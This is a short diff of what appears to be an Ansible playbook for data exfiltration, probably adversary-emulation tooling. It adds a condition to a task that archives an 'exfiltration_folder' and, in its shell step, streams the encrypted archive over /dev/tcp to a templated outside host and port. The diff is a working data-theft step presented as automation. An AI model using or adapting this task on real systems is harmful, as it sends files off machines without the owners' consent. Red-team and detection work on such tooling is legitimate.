@@ -25,6 +25,7 @@
         path: "{{ exfiltration_folder }}/*"
         dest: "{{ exfiltration_file }}-tcp.gz"
         format: gz
+      when: exfil_check.stat.exists
       shell: |
         tar czpf {{ exfiltration_file }}-tcp.tar.gz {{ exfiltration_folder }}/*
         cat {{ exfiltration_file }}-tcp.tar.gz.enc > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}
